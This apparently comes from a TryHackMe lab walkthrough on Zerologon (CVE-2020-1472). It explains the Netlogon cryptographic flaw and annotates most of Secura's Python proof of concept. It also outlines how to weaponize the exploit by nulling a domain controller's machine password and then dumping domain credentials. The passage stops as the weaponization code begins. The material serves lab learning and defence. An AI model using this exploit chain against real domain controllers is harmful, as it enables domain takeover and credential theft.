href=#what-domain-are-you-attacking>What domain are you attacking?</a></li><li><a href=#what-is-the-local-administrators-ntlm-hash>What is the Local Administrator&rsquo;s NTLM hash?</a></li><li><a href=#password-dumping>Password dumping:</a></li><li><a href=#how-many-domain-admin-accounts-are-there>How many Domain Admin accounts are there?</a></li><li><a href=#what-is-the-root-flag>What is the root flag?</a></li><li><a href=#pass-the-hash>Pass the Hash</a></li></ul></li></ul></nav></div></details></div><div class=post-content><hr><h2 id=zero-logon---the-zero-day-angle>Zero Logon - The Zero Day Angle<a hidden class=anchor aria-hidden=true href=#zero-logon---the-zero-day-angle>#</a></h2><script src=https://tryhackme.com/badge/434937></script><h2 id=room-subscription-only>Room <a href=https://tryhackme.com/room/zer0logon>Subscription Only</a><a hidden class=anchor aria-hidden=true href=#room-subscription-only>#</a></h2><hr><h3 id=about-the-vulnerability-->About The vulnerability -<a hidden class=anchor aria-hidden=true href=#about-the-vulnerability-->#</a></h3><p>On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.</p><p>Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short &ndash; the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero.</p><h3 id=about-machine-accounts-->About Machine Accounts -<a hidden class=anchor aria-hidden=true href=#about-machine-accounts-->#</a></h3><p>Normally, if we tried a statistics based attack on any user account, we would get locked out. This is not the case if we apply this principal to machine accounts. Machines accounts behave in a much different way than standard user accounts. They have no predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them, making them very difficult to break into. They&rsquo;re not meant to be accessed by an end user by any means. In certain circumstances, we can dump the machine account password using a tool like Mimikatz, but if we&rsquo;re at that point, we&rsquo;ve already compromised the machine &ndash; and we&rsquo;re looking for persistence within the domain, not lateral movement.</p><h3 id=abusing-the-vulnerability-->Abusing the Vulnerability -<a hidden class=anchor aria-hidden=true href=#abusing-the-vulnerability-->#</a></h3><p>Machine accounts often hold system level privileges which we can use for a variety of things. If you&rsquo;re not familiar with Active Directory, we can take the Domain Controller&rsquo;s Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py (SecretsDump is a password dumping utility like Mimikatz, except it lives on the Network instead of the host) to dump all of the passwords within the domain. At this point we have a rough kill chain starting to form:</p><p>Use Zero Logon to bypass authentication on the Domain Controller&rsquo;s Machine Account -> Run Secretsdump.py to dump credentials -> Crack/Pass Domain Admin Hashes -> ??? -> Profit</p><h3 id=analyzing-the-ms-nrpc-logon-process-->Analyzing the MS-NRPC Logon Process -<a hidden class=anchor aria-hidden=true href=#analyzing-the-ms-nrpc-logon-process-->#</a></h3><p>At this point, we know a vulnerability exists, but we&rsquo;re not quite sure how to exploit it yet. We&rsquo;ll be covering that soon, but what we do know there&rsquo;s a vulnerability within the way Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC. To better understand the vulnerability, we need to do a bit of a deeper dive on how Microsoft handles authentication to NRPC.</p><p>To analyze where the vulnerability occurs, we&rsquo;ll be using the Diagram provided by Secura as well as Microsoft Documentation to decipher the magic behind Zero Logon. The sources can be found at the bottom of this task.</p><p><img alt=zerologon loading=lazy src=https://raw.githubusercontent.com/anir0y/thm-notes/main/zerologon/img/fig.png></p><p>Step 1. The client creates a NetrServerReqChallenge and sends it off [Figure 1. Step 1]. This contains the following values:</p><ol><li>The DC</li><li>The Target Device (Also the DC, in our case)</li><li>A Nonce (In our case is 16 Bytes of Zero).</li></ol><p>Step 2. The server receives the NetrServerReqChallenge, the server will then generate it&rsquo;s own Nonce (This is called the Server Challenge), the server will send the Server Challenge back. [Figure 1. Step 2]</p><p>Step 3. The client (us) will compute it&rsquo;s NetLogon Credentials with the Server Challenge provided [Figure 1. Step 3]. It uses the NetrServerAuthenticate3 method which requires the following parameters:</p><ol><li>A Custom Binding Handle (Impacket handles this for us, it&rsquo;s negotiated prior)</li><li>An Account Name (The Domain Controller&rsquo;s machine account name. ex: DC01$)</li><li>A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: [nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel])</li><li>The Computer Name (The Domain Controller ex: DC01)</li><li>The Client Credential String (this will be 8 hextets of \x00 [16 Bytes of Zero])</li><li>Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura)</li></ol><p>Step 4. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it&rsquo;s known, good values. If the results are good, the server will send the required info back to the client. [Figure 1. Step 4.]</p><p>At this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we&rsquo;re hoping for the Server to a have the same computations as the client. This is where are 1-in-256 chance comes in.</p><p>Step 5. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful. [Figure 1. Step 5]</p><p>From there, normal RPC communications can occur.</p><p>Sources -</p><ol><li>Tom Tervoort of Secura - <a href="https://www.secura.com/pathtoimg.php?id=2055">https://www.secura.com/pathtoimg.php?id=2055</a></li><li>Microsoft - <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9</a></li><li>Microsoft - <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9</a></li></ol><h2 id=impacket-installation>Impacket Installation<a hidden class=anchor aria-hidden=true href=#impacket-installation>#</a></h2><p>Git Clone Impacket -</p><p>As a prior warning, Impacket can be quite fussy when it comes to some modules within nrpc.py, because of this, we recommend using the TryHackMe Attack Box. This will make the exploit run faster, additionally, we can attempt to provide better support via the Attack Box. Additionally, we are going to be using a Virtual Environment to Install Impacket. The instructions to install Impacket are as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m pip install virtualenv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 -m virtualenv impacketEnv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>source</span> impacketEnv/bin/activate
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pip install git+https://github.com/SecureAuthCorp/impacket
</span></span></code></pre></div><p>After executing these commands, you should be placed within a Python3 Virtual Environment that will be compatible to modify the PoC to exploit Zero Logon.</p><h2 id=modifying-and-weaponizing-the-poc>Modifying and Weaponizing the PoC<a hidden class=anchor aria-hidden=true href=#modifying-and-weaponizing-the-poc>#</a></h2><h3 id=poc-and-you-->PoC and You -<a hidden class=anchor aria-hidden=true href=#poc-and-you-->#</a></h3><p>Proof of Concepts are incredibly important to every exploit, without them, the exploit&rsquo;s are almost entirely theoretical. Fortunately, Secura was able to provide a working Proof of Concept for Zero Logon that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 1, Secura was even kind enough to give us the method that we need to call (NetrServerPasswordSet2). Looking up the method within the Microsoft Documentation, it&rsquo;s very similar to hNetSeverAuthenticate3, so we&rsquo;re going to re-use some of the same variables from that, as well as the structure.</p><h3 id=analyzing-the-poc-->Analyzing the PoC -<a hidden class=anchor aria-hidden=true href=#analyzing-the-poc-->#</a></h3><p>Before we continue any further, you should download the PoC from Secura, which can be found here:</p><p><a href=https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py>https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py</a></p><p>The script may seem quite daunting at first, but it&rsquo;s quite simple, if you think back to Figure 1 from Task 1, you&rsquo;ll quickly see how it all starts to fit together. Let&rsquo;s start by breaking the PoC down. We&rsquo;re going to be this in order of execution/importance so it&rsquo;s easier to digest:</p><p><strong>Lines 3 - 13</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket.dcerpc.v5</span> <span class=kn>import</span> <span class=n>nrpc</span><span class=p>,</span> <span class=n>epm</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket.dcerpc.v5.dtypes</span> <span class=kn>import</span> <span class=n>NULL</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket.dcerpc.v5</span> <span class=kn>import</span> <span class=n>transport</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket</span> <span class=kn>import</span> <span class=n>crypto</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span><span class=o>,</span> <span class=nn>hashlib</span><span class=o>,</span> <span class=nn>struct</span><span class=o>,</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>socket</span><span class=o>,</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>binascii</span> <span class=kn>import</span> <span class=n>hexlify</span><span class=p>,</span> <span class=n>unhexlify</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>subprocess</span> <span class=kn>import</span> <span class=n>check_call</span>
</span></span><span class=line><span class=cl><span class=n>MAX_ATTEMPTS</span> <span class=o>=</span> <span class=mi>2000</span>
</span></span></code></pre></div><p>Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we&rsquo;re defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000.</p><p>Lines 76 - 86</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=mi>3</span> <span class=o>&lt;=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Note: dc-name should be the (NetBIOS) computer name of the domain controller.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=n>_</span><span class=p>,</span> <span class=n>dc_name</span><span class=p>,</span> <span class=n>dc_ip</span><span class=p>]</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dc_name</span> <span class=o>=</span> <span class=n>dc_name</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s1>&#39;$&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>perform_attack</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\\\\</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>dc_name</span><span class=p>,</span> <span class=n>dc_ip</span><span class=p>,</span> <span class=n>dc_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span></code></pre></div><p>Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it&rsquo;s exactly 3 (zerologon_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it&rsquo;s greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc_name, and dc_ip. After the arguments are passed, dc_name is being stripped of the &ldquo;$&rdquo; character, as the dc_name variable shouldn&rsquo;t have it. The user account name should however. Afterwards, it&rsquo;s passing the variables two variables and an additional, modified variable into a module called &ldquo;perform_attack&rdquo;.</p><p>Lines 57 - 73</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>perform_attack</span><span class=p>(</span><span class=n>dc_handle</span><span class=p>,</span> <span class=n>dc_ip</span><span class=p>,</span> <span class=n>target_computer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Performing authentication attempts...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=n>rpc_con</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=n>attempt</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>MAX_ATTEMPTS</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>rpc_con</span> <span class=o>=</span> <span class=n>try_zero_authenticate</span><span class=p>(</span><span class=n>dc_handle</span><span class=p>,</span> <span class=n>dc_ip</span><span class=p>,</span> <span class=n>target_computer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rpc_con</span> <span class=o>==</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;=&#39;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=n>rpc_con</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Success! DC can be fully compromised by a Zerologon attack.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Attack failed. Target is probably patched.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span></code></pre></div><p>Line 1 is defining where the variables are being passed into for the local function, \DCNAME is being passed into the dc_handle variable, dc_ip is being passed into dc_ip variable, and dc_name is being passed into the target_computer variable. All of which will be used later, or passed into different modules.</p><p>Line 4 sets the variable rpc_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it&rsquo;s not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc_con variable to the output of a different function called &ldquo;try_zero_authenticate&rdquo; with a couple of variables being passed to it, specifically dc_handle, dc_ip, and target_computer. All of which we addressed earlier. The next lines are simply checking if rpc_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.</p><p>Lines 20-25</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>def try_zero_authenticate<span class=o>(</span>dc_handle, dc_ip, target_computer<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nv>binding</span> <span class=o>=</span> epm.hept_map<span class=o>(</span>dc_ip, nrpc.MSRPC_UUID_NRPC, <span class=nv>protocol</span><span class=o>=</span><span class=s1>&#39;ncacn_ip_tcp&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=nv>rpc_con</span> <span class=o>=</span> transport.DCERPCTransportFactory<span class=o>(</span>binding<span class=o>)</span>.get_dce_rpc<span class=o>()</span>
</span></span><span class=line><span class=cl>  rpc_con.connect<span class=o>()</span>
</span></span><span class=line><span class=cl>  rpc_con.bind<span class=o>(</span>nrpc.MSRPC_UUID_NRPC<span class=o>)</span>
</span></span><span class=line><span class=cl>  
</span></span></code></pre></div><p>Lines 27-40</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> <span class=nv>plaintext</span> <span class=o>=</span> b<span class=s1>&#39;\x00&#39;</span> * <span class=m>8</span>
</span></span><span class=line><span class=cl> <span class=nv>ciphertext</span> <span class=o>=</span> b<span class=s1>&#39;\x00&#39;</span> * <span class=m>8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nv>flags</span> <span class=o>=</span> 0x212fffff
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   nrpc.hNetrServerReqChallenge<span class=o>(</span>rpc_con, dc_handle + <span class=s1>&#39;\x00&#39;</span>, target_computer + <span class=s1>&#39;\x00&#39;</span>, plaintext<span class=o>)</span>
</span></span><span class=line><span class=cl>  try:
</span></span><span class=line><span class=cl>    <span class=nv>server_auth</span> <span class=o>=</span> nrpc.hNetrServerAuthenticate3<span class=o>(</span>rpc_con, dc_handle + <span class=s1>&#39;\x00&#39;</span>, target_computer + <span class=s1>&#39;$\x00&#39;</span>, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + <span class=s1>&#39;\x00&#39;</span>, ciphertext, flags<span class=o>)</span>
</span></span></code></pre></div><p>Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of &ldquo;\x00&rdquo; which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).</p><p>Line 6 is where the fun beings &ndash; This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32>Microsoft Documentation:</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>NTSTATUS NetrServerReqChallenge<span class=o>(</span>
</span></span><span class=line><span class=cl>  <span class=o>[</span>in, unique, string<span class=o>]</span> LOGONSRV_HANDLE PrimaryName,
</span></span><span class=line><span class=cl>  <span class=o>[</span>in, string<span class=o>]</span> wchar_t* ComputerName,
</span></span><span class=line><span class=cl>  <span class=o>[</span>in<span class=o>]</span> PNETLOGON_CREDENTIAL ClientChallenge,
</span></span><span class=line><span class=cl><span class=o>)</span><span class=p>;</span>
</span></span></code></pre></div><p>The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 bytes of &ldquo;\x00&rdquo;.</p><p>And the client will receive back, which will be used in Figure 1, Step 2:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>NTSTATUS NetrServerReqChallenge<span class=o>(</span>
</span></span><span class=line><span class=cl>   <span class=o>[</span>out<span class=o>]</span> PNETLOGON_CREDENTIAL ServerChallenge
</span></span><span class=line><span class=cl> <span class=o>)</span><span class=p>;</span>
</span></span></code></pre></div><p>Lines 8 sets up a try except (we&rsquo;ll see the rest of that in the next few lines), but in line 9 is where we actually attempt to exploit the Zero Logon vulnerability, this would be Figure 1, Step 3. This section requires a fair bit more information, per the Microsoft Documentation for NetrServerAuthenticate3, the following is required:</p><pre tabindex=0><code>NTSTATUS NetrServerAuthenticate3(
   [in, unique, string] LOGONSRV_HANDLE PrimaryName,
   [in, string] wchar_t* AccountName,
   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
   [in, string] wchar_t* ComputerName,
   [in] PNETLOGON_CREDENTIAL ClientCredential,
   [in, out] ULONG * NegotiateFlags,
 );
</code></pre><p>On line 9, we supply the DC_Handle as the Primary Name, the Target Computer plus a $ as the Machine Account Name (Recall, Machine accounts do not have lockout policies), the Secure Channel Type as the Secure Channel Type previously established over RPC, the target_computer variable as the ComputerName, the Ciphertext (16 bytes of &ldquo;\x00&rdquo; attempting to Abuse Zero Logon, remember there&rsquo;s 1-in-256 chance that the Ciphertext will be the same as the plaintext), and lastly, our flags variable that mimics those of a Windows 10 client machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>NTSTATUS NetrServerAuthenticate3<span class=o>(</span>
</span></span><span class=line><span class=cl>  <span class=o>[</span>out<span class=o>]</span> PNETLOGON_CREDENTIAL ServerCredential,
</span></span><span class=line><span class=cl>  <span class=o>[</span>in, out<span class=o>]</span> ULONG * NegotiateFlags,
</span></span><span class=line><span class=cl>  <span class=o>[</span>out<span class=o>]</span> ULONG * AccountRid
</span></span><span class=line><span class=cl><span class=o>)</span><span class=p>;</span>
</span></span></code></pre></div><p>Additionally, we expect to receive two (possibly 3) things back from the Server upon (hopefully) successful exploitation of Zero Logon: The ServerCredential and AccountRid, only one of which we are going to use.</p><p>Line 44 - 54</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>    assert server_auth<span class=o>[</span><span class=s1>&#39;ErrorCode&#39;</span><span class=o>]</span> <span class=o>==</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> rpc_con
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  except nrpc.DCERPCSessionError as ex:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> ex.get_error_code<span class=o>()</span> <span class=o>==</span> 0xc0000022:
</span></span><span class=line><span class=cl>      <span class=k>return</span> None
</span></span><span class=line><span class=cl>    <span class=k>else</span>:
</span></span><span class=line><span class=cl>      fail<span class=o>(</span>f<span class=s1>&#39;Unexpected error code from DC: {ex.get_error_code()}.&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  except BaseException as ex:
</span></span><span class=line><span class=cl>    fail<span class=o>(</span>f<span class=s1>&#39;Unexpected error: {ex}.&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	
</span></span></code></pre></div><p>Line 1 is retrieving the Error Code from the Server_auth variable, or the variable assigned to establish an Authentication Session with the target device. If successful, we&rsquo;re going to return the rpc_con variable which will inform us that we have successfully bypassed Authentication with Zero Logon. Lines 3-12 are simply Error handling lines so the program doesn&rsquo;t break and exit after receiving an error back.</p><h3 id=end-of-transmission-whats-next-->End of Transmission, What&rsquo;s Next? -<a hidden class=anchor aria-hidden=true href=#end-of-transmission-whats-next-->#</a></h3><p>And that&rsquo;s all there is to the Proof of Concept. It&rsquo;s not some giant, scary monster. It even successfully exploit the Zero Logon vulnerability for us &ndash; but it stops and doesn&rsquo;t do anything further, so how do we proceed?</p><p>Good question, next we need to take a look at the Microsoft Documentation itself and see what we can do to interact with NRPC Itself. If you&rsquo;re not familiar with NRPC, and you&rsquo;re not that technical of an individual, look back at the last step in Task 1, Figure 3 (hint: It tells us what we need to do).</p><h3 id=whats-it-all-mean-doc-->What&rsquo;s It All Mean, Doc? -<a hidden class=anchor aria-hidden=true href=#whats-it-all-mean-doc-->#</a></h3><p>After going back and peaking at Figure 3 on Task 1, or researching how to reset a password over RDP, you should have came across the following document:
<a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81</a></p><p>The document outlines what information is required to change a password over NRPC. The following information is required to do so:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=n>NTSTATUS</span> <span class=n>NetrServerPasswordSet2</span><span class=p>(</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>,</span> <span class=n>unique</span><span class=p>,</span> <span class=n>string</span><span class=p>]</span> <span class=n>LOGONSRV_HANDLE</span> <span class=n>PrimaryName</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>,</span> <span class=n>string</span><span class=p>]</span> <span class=n>wchar_t</span><span class=o>*</span> <span class=n>AccountName</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>]</span> <span class=n>NETLOGON_SECURE_CHANNEL_TYPE</span> <span class=n>SecureChannelType</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>,</span> <span class=n>string</span><span class=p>]</span> <span class=n>wchar_t</span><span class=o>*</span> <span class=n>ComputerName</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>]</span> <span class=n>PNETLOGON_AUTHENTICATOR</span> <span class=n>Authenticator</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>]</span> <span class=n>PNL_TRUST_PASSWORD</span> <span class=n>ClearNewPassword</span>
</span></span><span class=line><span class=cl> <span class=p>);</span>
</span></span></code></pre></div><p>Going back and looking at <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9>NetrServerAuthenticate3</a> and <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81>NetrServerPasswordSet2</a>, we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name. So we simply need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft, so lets take a look at the <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab>Authenticator</a> first:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>typedef</span> <span class=n>struct</span> <span class=n>_NETLOGON_AUTHENTICATOR</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>NETLOGON_CREDENTIAL</span> <span class=n>Credential</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>DWORD</span> <span class=n>Timestamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>And suddenly we&rsquo;ve hit another unknown, NETLOGON_CREDENTIAL. Fortunately, Microsoft does have documentation for <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/d55e2632-7163-4f6c-b662-4b870e8cc1cd>NETLOGON_CREDENTIAL</a> as well:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> typedef struct _NETLOGON_CREDENTIAL <span class=o>{</span>
</span></span><span class=line><span class=cl>  CHAR data<span class=o>[</span>8<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span> NETLOGON_CREDENTIAL,
</span></span><span class=line><span class=cl> *PNETLOGON_CREDENTIAL<span class=p>;</span>
</span></span></code></pre></div><p>Per the documentation, NETLOGON_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that &ldquo;the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation&rdquo;, fortunately we know this value, thanks to Zero Logon, it&rsquo;s 8 bytes of Zero. In terms of the Timestamp, it&rsquo;s a DWORD value, so it can either be a one or a zero. Zero sounds perfectly find to me.</p><p>In order to change the password the Microsoft Documentation states that:
The Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes indicting the length of the password, totaling 516 bytes.
For the simplicity of this room, we can simply supply 516 bytes of all 00 to make a null password. Eventually, we can work towards creating our own custom password, but once again, for simplicity, we&rsquo;re setting it to a null value now.</p><h3 id=level-up>Level up<a hidden class=anchor aria-hidden=true href=#level-up>#</a></h3><p>Now that we know the required arguments to change the password via NRPC, we actually have to implement it in Python. We need to take a look at the <a href=https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py>nrpc.py</a> module within Impacket to see the required structure for how we can craft a netrServerPasswordSet2 Request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
